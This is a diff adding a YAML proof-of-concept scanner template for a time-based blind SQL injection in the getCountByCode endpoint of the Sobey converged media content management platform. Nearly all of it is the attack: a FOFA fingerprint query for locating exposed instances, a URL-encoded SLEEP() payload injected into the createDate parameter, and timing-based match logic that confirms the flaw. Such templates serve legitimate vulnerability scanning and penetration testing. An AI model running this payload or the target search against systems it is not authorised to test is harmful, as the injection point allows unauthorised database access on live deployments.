@@ -1,0 +1,18 @@
+id: poc-yaml-sobey-imcmp-getcountbycode-sqli
+info:
+  name: 索贝融合媒体内容管理平台 getCountByCode SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 索贝融合媒体内容管理平台
+  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+variables:
+  t1: random_int(2,5)
+  t2: t1 * 3
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /sobey-mchEditor/count/getCountByCode?status=1&createDate=%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%28{{.t1}}%29%29%29x%29%20AND%20%271%27=%271
+  expression: status_code == 200 && contains(headers,"Sobey") && contains(body,"\"data\":")
+    && contains(body,"获取数据成功") && duration > t2 && duration < t3
+transport: http
